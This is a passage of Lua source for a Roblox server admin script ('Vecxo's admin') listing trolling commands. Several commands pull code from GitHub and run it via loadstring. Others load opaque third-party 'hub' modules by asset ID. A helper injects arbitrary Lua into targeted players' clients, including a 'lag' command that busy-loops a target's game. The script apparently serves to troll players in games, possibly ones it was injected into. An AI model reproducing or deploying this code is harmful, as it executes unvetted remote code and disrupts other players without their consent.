						hideplr(plr.Name)
					end
				end)
			end
			game.Players.ChildAdded:Connect(function(cxo)
				local time = tick()
				repeat task.wait() until cxo and cxo.Character and cxo.Character:FindFirstChild("Humanoid") and cxo.Character:FindFirstChild("Head") or time >= 10
				for i,v in pairs(game.Players:GetPlayers()) do
					if table.find(hidden, v.UserId) then
						connect(v)
						hideplr(v.Name)
					end
				end
			end)
			hideplr(plr.Name)
			connect(plr)
		end
	end
})

addcmd({
	Name = "unhide",
	Aliases = {"unvanish"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if table.find(hidden, plr.UserId) then

				table.remove(hidden, table.find(hidden, plr.UserId))
				local rnpos = nil

				if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
					rnpos = plr.Character.HumanoidRootPart.CFrame
				end

				plr:LoadCharacter()
				notfi(plr, "Vecxo's admin", "You have been unvanished! To fully reappear you must rejoin the server (".. _G.prefix .."rejoin)")

				if rnpos ~= nil then
					plr.Character:WaitForChild("HumanoidRootPart").CFrame = rnpos
				end

				if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
					local ticking = tick()
					require(112354705578311).load() -- goog readder
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

				if not goog then
					warn("goog failed to be added, command can not continue")
					notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr
				scr:WaitForChild("Exec").Value = [[

					if workspace:FindFirstChild("Vanished") then
						workspace.Vanished:Destroy()
					end

					script:Destroy()
					
				]]

				scr.Name = "GUI"
				scr.Enabled = true

				if plr.PlayerGui then
					scr.Parent = plr.PlayerGui
				else
					if plr.Character then
						scr.Parent = plr.Character
					end
				end
			end
		end
	end
})

--[[
addcmd({
	Name = "impersonate",
	Aliases = {"disguise"},
	Function = function(sender, targets, arguments)
		local name = table.concat(arguments, " ")
		local id

		local success, targetid = pcall(function()
			return game.Players:GetUserIdFromNameAsync(name)
		end)

		if success then
			id = targetid
		else
			notfi(sender, "Vecxo's admin", "failed to retreieve user, is the name correct?")
			return
		end

		for i, plr in ipairs(targets) do

			local rnpos = nil
			plr.CharacterAppearanceId = id

			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
				rnpos = plr.Character:FindFirstChild("HumanoidRootPart").CFrame
			end

			plr:LoadCharacter()

			if rnpos ~= nil then
				plr.Character:WaitForChild("HumanoidRootPart").CFrame = rnpos
			end

			plr.CharacterAdded:Connect(function(cxo)
				local name = 
			end)

		end
	end
})
]]

addcmd({
	Name = "gentlemankiller",
	Aliases = {"gentk"},
	Function = function(sender, targets, arguments)
		if not restrictcheck(sender) then
			for i, plr in ipairs(targets) do
				local success, fail = pcall(function()
					require(5430831931).Dark(plr.Name)
				end)

				if not success then
					notfi(plr, "Vecxo's admin", "Failed to load gentlemankiller: ".. fail)
				end
			end
		else
			notfi(sender, "Vecxo's admin", "restricted mode is enabled, this command can't be used.")
		end
	end
})

addcmd({
	Name = "thanosglove",
	Aliases = {"thanos"},
	Function = function(sender, targets, arguments)
		if not restrictcheck(sender) then
			for i, plr in ipairs(targets) do
				local success, fail = pcall(function()
					require(13295485310).load(plr.Name)
				end)

				if not success then
					notfi(plr, "Vecxo's admin", "Failed to load thanos glove: ".. fail)
				end
			end
		else
			notfi(sender, "Vecxo's admin", "restricted mode is enabled, this command can't be used.")
		end
	end
})


addcmd({
	Name = "polariahub",
	Aliases = {"polaria"},
	Function = function(sender, targets, arguments)
		if not restrictcheck(sender) then
			for i, plr in ipairs(targets) do
				local success, fail = pcall(function()
					require(123255432303221):Pload(plr.Name)
				end)

				if not success then
					notfi(plr, "Vecxo's admin", "Failed to load Polaria Hub: ".. fail)
				end
			end
		else
			notfi(sender, "Vecxo's admin", "restricted mode is enabled, this command can't be used.")
		end
	end
})

addcmd({
	Name = "projecthub",
	Aliases = {"projhub"},
	Function = function(sender, targets, arguments)
		if not restrictcheck(sender) then
			for i, plr in ipairs(targets) do
				local success, fail = pcall(function()
					require(124840250479418)(plr.Name, "Standard")
				end)

				if not success then
					notfi(plr, "Vecxo's admin", "Failed to load Project Hub: ".. fail)
				end
			end
		else
			notfi(sender, "Vecxo's admin", "restricted mode is enabled, this command can't be used.")
		end
	end
})

addcmd({
	Name = "tazer",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local success, fail = pcall(function()
				require(13556064399).bzzt(plr.Name)
			end)

			if not success then
				notfi(plr, "Vecxo's admin", "Failed to load tazer: ".. fail)
			end
		end
	end
})


addcmd({
	Name = "jail",
	Aliases = {"trap"},
	Function = function(sender, targets, arguments)

		if not _G.Jail then
			local success, result = pcall(function() -- jail
				return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/jail")
			end)

			if success then
				local content = result
				local loaded, fail = loadstring(content)

				if loaded then
					loaded()
				else
					notfi(sender, "Vecxo's admin", "Failed to load jail: " .. fail)
				end
			else
				notfi(sender, "Vecxo's admin", "Failed to load jail")
			end
		end

		for i, plr in ipairs(targets) do
			if workspace:FindFirstChild(plr.Name .."'s jail") then return end
			_G.Jail(plr.Name)
			task.wait(0.15)
			if workspace:FindFirstChild(plr.Name .."'s jail") then
				plr.Character.HumanoidRootPart.CFrame = workspace:FindFirstChild(plr.Name .."'s jail").PrimaryPart.CFrame * CFrame.new(0,2.5,0)
				for i,v in pairs(workspace[plr.Name .."'s jail"]:GetChildren()) do -- im too lazy to update the github
					v.CastShadow = false
				end
			end
		end
	end
})

addcmd({
	Name = "unjail",
	Aliases = {"untrap"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if workspace:FindFirstChild(plr.Name .."'s jail") then
				workspace:FindFirstChild(plr.Name .."'s jail"):Destroy()
			end
		end
	end
})

addcmd({
	Name = "view",
	Aliases = {"spectate"},
	Player = false,
	Function = function(sender, targets, arguments)
		local arg, arg2

		if arguments[2] then
			arg = arguments[1]
			arg2 = arguments[2]
		elseif arguments[1] then
			arg = sender.Name
			arg2 = arguments[1]
		else
			notfi(sender, "Vecxo's admin", "You need to specify at least one player!")
			return
		end

		if arg == "me" then
			arg = sender.Name
		end

		local argt = p(arg, sender)
		local argt2 = p(arg2, sender)

		if #argt2 <= 0 then
			notfi(sender, "Vecxo's admin", "Invalid user! command example: ".. _G.prefix .."view plr")
			return
		end

		if argt[1].PlayerGui:FindFirstChild("SPECTATING") then
			argt[1].PlayerGui.SPECTATING:Destroy()
		end

		if not argt2[1].Character and not argt2[1].Character:FindFirstChild("Humanoid") then
			notfi(sender, "Vecxo's admin", argt2[1].Name .. " doesn't have a Humanoid!")
			return
		end

		if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
			local ticking = tick()
			require(112354705578311).load() -- goog readder
			repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
		end

		local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

		if not goog then
			warn("goog failed to be added, command can not continue")
			notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
			return
		end

		local scr = goog:FindFirstChild("Utilities").Client:Clone()
		local sgui = Instance.new("ScreenGui", argt[1].PlayerGui)
		sgui.ResetOnSpawn = false
		sgui.Name = "SPECTATING"
		local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

		loa.Parent = scr
		--print(argt2[1].Name)

		local fs = string.format([[ 
			local camera = game:GetService("Workspace").Camera
			local name = "%s"

			camera.CameraSubject = game.Players:FindFirstChild(name).Character:WaitForChild("Head")
			camera.CameraType = Enum.CameraType.Custom

			game.Players:FindFirstChild(name).CharacterAdded:Connect(function()
				camera.CameraSubject = game.Players:FindFirstChild(name).Character:WaitForChild("Head")
				camera.CameraType = Enum.CameraType.Custom
			end)

		]], argt2[1].Name)

		--print(fs)

		scr:WaitForChild("Exec").Value = fs

		scr.Parent = sgui

		--[[if argt[1] and argt[1].Character then
			scr.Parent = argt[1].Character
		else
			if argt[1] then
				scr.Parent = argt[1]:WaitForChild("PlayerGui")
			end
		end]]

		scr.Enabled = true

	end
})

addcmd({
	Name = "unview",
	Aliases = {"unspectate"},
	Function = function(sender, targets, arguments)

		if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
			local ticking = tick()
			require(112354705578311).load() -- goog readder
			repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
		end

		local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

		if not goog then
			warn("goog failed to be added, command can not continue")
			notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
			return
		end

		local scr = goog:FindFirstChild("Utilities").Client:Clone()
		local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

		loa.Parent = scr
		--print(argt2[1].Name)

		local fs = [[ 
			local camera = game:GetService("Workspace").Camera

			camera.CameraSubject = game.Players.LocalPlayer.Character:WaitForChild("Head")
			camera.CameraType = Enum.CameraType.Custom

			script:Destroy()
		]]

		--print(fs)

		scr:WaitForChild("Exec").Value = fs

		for i, plr in ipairs(targets) do

			if plr.PlayerGui:FindFirstChild("SPECTATING") then
				plr.PlayerGui.SPECTATING:Destroy()
			end

			if plr.Character then
				scr:Clone().Parent = plr.Character
			else
				if plr then
					scr:Clone().Parent = plr:WaitForChild("PlayerGui")
				end
			end

			scr.Enabled = true
		end
	end
})

addcmd({
	Name = "fps",
	Aliases = {"setfps"},
	Function = function(sender, targets, arguments)
		local value = arguments[1]
		for i, plr in ipairs(targets) do

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = string.format([[

				game:GetService("RunService").Heartbeat:Connect(function()
					local osclock = os.clock()
					while osclock + 1 / %s > os.clock() do
					end
					task.wait()
					osclock = os.clock()
				end)

			]], value)

			if plr and plr.PlayerGui then
				local s = Instance.new("ScreenGui", plr.PlayerGui)
				s.Name = "FPSBoosting"
				s.ResetOnSpawn = false
				scr.Parent = s
			else
				if plr and plr.Character then
					scr.Parent = plr.Character
				end
			end

			scr.Name = "FPSBoost"
			scr.Enabled = true
		end
	end
})

addcmd({
	Name = "lag",
	Aliases = {},
	Function = function(sender, targets, arguments)
		local value = arguments[1]
		for i, plr in ipairs(targets) do

			if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
				local ticking = tick()
				require(112354705578311).load() -- goog readder
				repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
			end

			local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

			if not goog then
				warn("goog failed to be added, command can not continue")
				notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
				return
			end

			local scr = goog:FindFirstChild("Utilities").Client:Clone()
			local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

			loa.Parent = scr
			scr:WaitForChild("Exec").Value = string.format([[

				game:GetService("RunService").Heartbeat:Connect(function()
					local osclock = os.clock()
					while osclock + 1 / math.random(1, %s) > os.clock() do
					end
					task.wait()
					osclock = os.clock()
				end)

			]], value)

			if plr and plr.PlayerGui then
				local s = Instance.new("ScreenGui", plr.PlayerGui)
				s.Name = "FPSBoosting"
				s.ResetOnSpawn = false
				scr.Parent = s
			else
				if plr and plr.Character then
					scr.Parent = plr.Character
				end
			end

			scr.Name = "FPSBoost"
			scr.Enabled = true
		end
	end
})

addcmd({
	Name = "restorefps",
	Aliases = {"fixfps"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("FPSBoost") then
				plr.Character:FindFirstChild("FPSBoost"):Destroy()
			else
				if plr.PlayerGui and plr.PlayerGui:FindFirstChild("FPSBoosting") then
					plr.PlayerGui:FindFirstChild("FPSBoosting"):Destroy()
				end
			end
		end
	end
})

addcmd({
	Name = "clone",
	Aliases = {"robot"},
	Player = false,
	Function = function(sender, targets, arguments)
		local target = table.concat(arguments, " ")
		local success, targetid = pcall(function()
			return game.Players:GetUserIdFromNameAsync(target)
		end)

		if success then
			if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				local cloned = game.Players:CreateHumanoidModelFromUserId(targetid) 
				cloned.Parent = workspace
				cloned:WaitForChild("HumanoidRootPart").CFrame = sender.Character:FindFirstChild("HumanoidRootPart").CFrame * CFrame.new(0, 0, -3)

				local a, b = pcall(function()
					return game:GetService("HttpService"):GetAsync("https://users.roproxy.com/v1/users/".. targetid)
				end)

				if a then
					cloned.Name = game:GetService("HttpService"):JSONDecode(b).displayName
				else
					notfi(sender, "Vecxo's admin", "Failed to get the username!")
				end

			end
		else
			notfi(sender, "Vecxo's admin", "Invalid username!")
		end
	end
})

addcmd({
	Name = "alpaca",
	Aliases = {"alpacas"},
	Player = false,
	Function = function(sender, targets, arguments)
		local int = tonumber(table.concat(arguments, " ", 1))

		if int <= 0 then
			notfi(sender, "Vecxo's admin", "You need to provide a number higher than 0!")
			return
		end

		if int > 1000 then
			notfi(sender, "Vecxo's admin", "Due to server crashing the limit is 1000")
			return
		end

		if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
			for i = 1, int do
				local p = Instance.new("Part", workspace)
				p.Name = "Alpaca"
				p.Size = Vector3.new(10, 10, 10)
				p.CFrame = sender.Character.HumanoidRootPart.CFrame * CFrame.new(math.random(-10, 10), 20, 0)
				local m = Instance.new("SpecialMesh", p)
				m.MeshId = "rbxassetid://273347765"
				m.TextureId = "rbxassetid://273347862"
				m.Offset = Vector3.new(0, 2, 0)
				m.Scale = Vector3.new(10, 10, 10)
			end
		end

	end
})

addcmd({
	Name = "cat",
	Aliases = {"cats"},
	Player = false,
	Function = function(sender, targets, arguments)
		local int = tonumber(table.concat(arguments, " ", 1))

		if int <= 0 then
			notfi(sender, "Vecxo's admin", "You need to provide a number higher than 0!")
			return
		end

		if int > 1000 then
			notfi(sender, "Vecxo's admin", "Due to server crashing the limit is 1000")
			return
		end

		if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
			for i = 1, int do
				local p = Instance.new("Part", workspace)
				p.Name = "Cat"
				p.Size = Vector3.new(7, 7, 7)
				p.CFrame = sender.Character.HumanoidRootPart.CFrame * CFrame.new(math.random(-10, 10), 20, 0)
				local m = Instance.new("SpecialMesh", p)
				m.MeshId = "http://roblox.com/asset/?id=273348803"
				m.TextureId = "http://roblox.com/asset/?id=273348757"
				m.Offset = Vector3.new(0, 0.5, 0)
				m.Scale = Vector3.new(7, 7, 7)
			end
		end

	end
})

addcmd({
	Name = "kawaii",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
				local p = Instance.new("Part", plr.Character)
				p.Name = "Cat"
				p.Size = Vector3.new(7, 7, 7)
				p.CFrame = plr.Character.HumanoidRootPart.CFrame
				p.CanCollide = false
				local m = Instance.new("SpecialMesh", p)
				m.MeshId = "http://roblox.com/asset/?id=273348803"
				m.TextureId = "http://roblox.com/asset/?id=273348757"
				m.Offset = Vector3.new(0, 1, 1)
				m.Scale = Vector3.new(7, 7, 7)
				local w = Instance.new("Weld", p)
				w.Part0 = plr.Character.HumanoidRootPart
				w.Part1 = p

				for i,v in pairs(plr.Character:GetChildren()) do
					if v:IsA("BasePart") and v.Name ~= "Cat" then
						v.Transparency = 1
					end
					if v:IsA("Accessory") then
						v:Destroy()
					end
				end
			end
		end
	end
})

addcmd({
	Name = "mesh",
	Aliases = {"insertmesh"},
	Player = false,
	Function = function(sender, targets, arguments)
		local id = tonumber(arguments[1])
		local mid = tonumber(arguments[2])

		if #arguments < 1 then
			notfi(sender, "Vecxo's admin", "You need to provide an ID!")
			return
		end

		local p = Instance.new("Part", workspace)
		p.Name = "cxo's admin inserted mesh"
		p.Size = Vector3.new(5, 5, 5)
		p.Anchored = true
		local m = Instance.new("SpecialMesh", p)
		m.MeshId = "http://roblox.com/asset/?id=".. id
		m.TextureId = "http://roblox.com/asset/?id=".. mid
		m.Offset = Vector3.new(0, 0, 0)
		m.Scale = Vector3.new(5, 5, 5)

		if sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
			p.CFrame = sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 2.5)
		end
	end
})

addcmd({
	Name = "playerlist",
	Aliases = {"plrlist"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.PlayerGui then
				gui(plr, "playerlist")
			end
		end
	end
})

addcmd({
	Name = "panel",
	Aliases = {"adminpanel"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			gui(plr, "panel")
		end
	end
})
--[[
addcmd({ -- Yeah i created an empty command so itd show in my cmds list, Big whoop wanna fight about it?
	Name = "pm",
	Aliases = {"privatemessage"},
	Function = function(sender, targets, arguments)
		local money = math.huge
	end
})
]]
addcmd({
	Name = "whitelist",
	Aliases = {"wl"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if not table.find(_G.Whitelist, tostring(plr.UserId)) and not table.find(TempWhitelist, plr.UserId) then
				table.insert(TempWhitelist, plr.UserId)
				notfi(plr, "Vecxo's admin", "You have been whitelisted! say ".. _G.prefix .."cmds to view cmds.")
				notfi(sender, "Vecxo's admin", "Whitelisted ".. plr.Name .." successfully!", 3)
			else
				notfi(sender, "Vecxo's admin", plr.Name .." is already whitelisted!", 3)
			end
		end
	end
})

addcmd({
	Name = "unwhitelist",
	Aliases = {"unwl"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if table.find(TempWhitelist, plr.UserId) then
				table.remove(TempWhitelist, table.find(TempWhitelist, plr.UserId))
			end
		end
	end
})

addcmd({
	Name = "whitelists",
	Aliases = {"wls", "wld", "whitelisted"},
	Player = false,
	Function = function(sender, targets, arguments)
		local whitelists = ""

		for i,v in pairs(_G.Whitelist) do
			if tonumber(v) then
				if not game.Players:GetPlayerByUserId(tonumber(v)) then 
					continue 
				end
				local success, plr = pcall(function()
					return game.Players:GetNameFromUserIdAsync(tonumber(v))
				end)
				if success and plr then
					whitelists = whitelists .. plr .. ", "
				end
			end
		end

		for i,v in pairs(TempWhitelist) do
			if not game.Players:GetPlayerByUserId(v) then 
				continue 
			end
			local success, plr = pcall(function()
				return game.Players:GetNameFromUserIdAsync(v)
			end)
			if success and plr then
				whitelists = whitelists .. plr .. ", "
			end
		end

		if #whitelists > 2 then
			whitelists = whitelists:sub(1, -3)
		end

		notfi(sender, "Vecxo's admin", "Whitelisted users: " .. whitelists, 7.5)
	end
})

addcmd({
	Name = "char",
	Aliases = {"nchar"},
	Function = function(sender, targets, arguments)
		local name = table.concat(arguments, " ")
		local id

		local success, targetid = pcall(function()
			return game.Players:GetUserIdFromNameAsync(name)
		end)

		if success then
			id = targetid
		else
			notfi(sender, "Vecxo's admin", "failed to retreieve user, is the name correct?")
			return
		end

		for i, plr in ipairs(targets) do
			local rnpos = nil
			plr.CharacterAppearanceId = id

			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
				rnpos = plr.Character:FindFirstChild("HumanoidRootPart").CFrame
			end

			plr:LoadCharacter()

			if rnpos ~= nil then
				plr.Character:WaitForChild("HumanoidRootPart").CFrame = rnpos
			end

		end
	end
})

addcmd({
	Name = "unchar",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			local rnpos = nil
			plr.CharacterAppearanceId = plr.UserId

			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
				rnpos = plr.Character:FindFirstChild("HumanoidRootPart").CFrame
			end

			plr:LoadCharacter()

			if rnpos ~= nil then
				plr.Character:WaitForChild("HumanoidRootPart").CFrame = rnpos
			end

		end
	end
})

addcmd({
	Name = "kidnap",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("Torso") and plr.Character:FindFirstChild("Humanoid") then
				if not _G.kidnap then
					local success, result = pcall(function() -- clown van script
						return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/clownvan")
					end)

					if success then
						local content = result
						local loaded, fail = loadstring(content)
						if loaded then
							loaded()
							_G.kidnap(plr)
						else
							notfi(sender, "Vecxo's admin", "Failed to load the clown van")
						end
					else
						notfi(sender, "Vecxo's admin", "Failed to load the clown van")
					end
				else
					_G.kidnap(plr)
				end
			end
		end
	end
})

addcmd({
	Name = "grabgun",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			if plr.Character and plr.Character:FindFirstChild("Torso") and plr.Character:FindFirstChild("Humanoid") then

				_G.GunMan = plr.Name -- could make this work without _G but idgaf

				if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
					local ticking = tick()
					require(112354705578311).load() -- goog readder
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

				if not goog then
					warn("goog failed to be added, command can not continue")
					notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Client:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr
				scr:WaitForChild("Exec").Value = [[
				
				local Player = game:GetService("Players").LocalPlayer
				local Char = Player.Character
				local Event = Char:WaitForChild("UserInput_Event")
				local UIS = game:GetService("UserInputService")
				local input = function(io,a)
					if a then return end
					local io = {KeyCode=io.KeyCode,UserInputType=io.UserInputType,UserInputState=io.UserInputState}
					Event:FireServer(io)
				end
				UIS.InputBegan:Connect(input)
				UIS.InputEnded:Connect(input)
				local Changed = false
				local Mouse = Player:GetMouse()
				local h,t = Mouse.Hit,Mouse.Target
				while wait(1/30) do
					if h~=Mouse.Hit or t~=Mouse.Target then
						Event:FireServer({isMouse=true,Target=Mouse.Target,Hit=Mouse.Hit})
						h,t=Mouse.Hit,Mouse.Target
					end
				end

				]]

				if plr.Character then
					scr.Parent = plr.Character
				else
					scr.Parent = plr:WaitForChild("PlayerGui")
				end

				scr.Enabled = true

				if not game:GetService("ServerScriptService"):FindFirstChild("goog") then
					local ticking = tick()
					require(112354705578311).load() -- goog readder
					repeat task.wait() until game:GetService("ServerScriptService"):FindFirstChild("goog") or tick() - ticking >= 10
				end

				local goog = game:GetService("ServerScriptService"):FindFirstChild("goog")

				if not goog then
					warn("goog failed to be added, command can not continue")
					notfi(sender, "Vecxo's admin", "goog failed to be added, command can not continue")
					return
				end

				local scr = goog:FindFirstChild("Utilities").Server:Clone()
				local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

				loa.Parent = scr

				local success, content = pcall(function() -- grab gun script
					return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/grabgun")
				end)

				if success and typeof(content) == "string" then
					local loaded, fail = loadstring(content)
					if loaded then
						scr:WaitForChild("Exec").Value = content
						if plr.Character then
							scr.Parent = plr.Character
						else
							scr.Parent = plr:WaitForChild("PlayerGui")
						end
						scr.Name = "GrabGunMain"
						scr.Enabled = true
					else
						notfi(sender, "Vecxo's admin", "Failed to load the grab gun: " .. tostring(fail))
					end
				else
					notfi(sender, "Vecxo's admin", "Failed to load the grab gun")
				end

			end

		end
	end
})

addcmd({
	Name = "bombvest",
	Aliases = {"bomber"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			require(18683323231).bombvest(plr.Name)
		end
	end
})

addcmd({
	Name = "grabknife",
	Aliases = {"knife"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			require(18665717275).load(plr.Name)
		end
	end
})

addcmd({
	Name = "goog",
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)
		if game:GetService("ServerScriptService"):FindFirstChild("goog") then
			game:GetService("ServerScriptService"):FindFirstChild("goog"):Destroy()
		end

		require(112354705578311).load() -- goog l0ader
	end
})

addcmd({
	Name = "tag", -- tech loves this command
	Aliases = {},
	Player = false,
	Function = function(sender, targets, arguments)
		local torf = arguments[1]

		if torf ~= "true" and torf ~= "false" then
			notfi(sender, "Vecxo's admin", "The values are true or false! example: ".. _G.prefix .."tag true")
		end

		local bool = (torf == "true")

		if torf:lower() == "true" then
			tag = true
			cxoconnections["ftag"]()
		elseif torf:lower() == "false" then
			tag = false
			for i,t in pairs(game.Teams:GetChildren()) do
				if t.Name == "cxo's admin is loaded" or t.Name == "! cxo's admin is loaded !" then
					t:Destroy()
				end
			end
		end

	end
})

addcmd({
	Name = "ping",
	Aliases = {"latency"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do

			--[[if not table.find(anticheatmeasure, plr.UserId) then
				table.insert(anticheatmeasure, plr.UserId)
			end]]

			ping = plr:GetNetworkPing() * 1000

			if ping ~= nil then
				notfi(sender, "Vecxo's admin", plr.Name .. "'s ping is: " .. math.floor(ping))
			else
				notfi(sender, "Vecxo's admin", "Failed to retrieve ping for " .. plr.Name)
			end

			--table.remove(anticheatmeasure, plr.UserId)
		end
	end
})
--[[
-- Gui to Lua
-- Version: 3.2

-- Instances:

local cxosadmincommandbar = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextBox = Instance.new("TextBox")
local TextButton = Instance.new("TextButton")

--Properties:

cxosadmincommandbar.Name = "cxo's admin command bar"
cxosadmincommandbar.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
cxosadmincommandbar.ResetOnSpawn = false

Frame.Parent = cxosadmincommandbar
Frame.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
Frame.BackgroundTransparency = 0.500
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.ClipsDescendants = true
Frame.Position = UDim2.new(0, 0, 0.959999979, 0)
Frame.Size = UDim2.new(0, 200, 0, 30)

TextBox.Parent = Frame
TextBox.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
TextBox.BackgroundTransparency = 0.500
TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextBox.BorderSizePixel = 0
TextBox.Size = UDim2.new(0, 178, 0, 30)
TextBox.Font = Enum.Font.SourceSansBold
TextBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
TextBox.PlaceholderText = "Enter Command"
TextBox.Text = ""
TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
TextBox.TextSize = 20.000
TextBox.TextWrapped = true

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BackgroundTransparency = 0.500
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.889999986, 0, 0, 0)
TextButton.Size = UDim2.new(0, 22, 0, 29)
TextButton.Font = Enum.Font.SourceSansBold
TextButton.Text = "<"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 15.000
TextButton.TextWrapped = true

local open = true
local tweenTime = 0.5
local closedPosition = UDim2.new(0, -180, 0.959999979, 0)
local openPosition = UDim2.new(0, 0, 0.959999979, 0)

local function tween(focus)
	open = not open
	local targetPosition = open and openPosition or closedPosition
	local tween = game:GetService("TweenService"):Create(Frame, TweenInfo.new(tweenTime, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = targetPosition})
	tween:Play()

	TextButton.Text = open and ">" or "<"

	if focus and open then
		TextBox:CaptureFocus()
	end
end

TextButton.MouseButton1Click:Connect(function()
	tween(true)
end)

TextBox.FocusLost:Connect(function(enter)
	if enter then
		local cmd = TextBox.Text
		if cmd ~= "" then
			local args = {}
			local plrs = {}

			for word in cmd:gmatch("%S+") do
				table.insert(args, word)
			end

			local command = args[1]
			local arguments = {}

			for i = 2, #args do
				if game.Players:FindFirstChild(args[i]) then
					table.insert(plrs, args[i])
				else
					table.insert(arguments, args[i])
				end
			end

			if command then
				if #plrs > 0  then
					if #arguments > 0 then
						runcmd(command, nil, plrs, arguments)
					else
						runcmd(command, nil, plrs, nil)
					end
				else
					runcmd(command, nil, nil, nil)
				end
			end
		end
	end
end)

game:GetService("UserInputService").InputBegan:Connect(function(input, processed)
	if processed then return end 

	if input.KeyCode == Enum.KeyCode.X then
		task.wait()
		TextBox.Text = ""
		if not open then
			tween(true)
		else
			TextBox:CaptureFocus()
		end
	end
end)--]]

addcmd({
	Name = "cmdbar",
	Aliases = {"commandbar"},
	Player = false,
	Function = function(sender, targets, arguments)

		if not table.find(cmdbared, sender.UserId) then
			table.insert(cmdbared, sender.UserId)
		end

		if sender.PlayerGui and sender.PlayerGui:FindFirstChild("Command Bar") then
			return
		end

		if game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):FindFirstChild("Command Bar") then
			if sender.PlayerGui then
				game:GetService("ReplicatedStorage"):FindFirstChild("cxo's folder"):WaitForChild("Command Bar"):Clone().Parent = sender.PlayerGui
			else
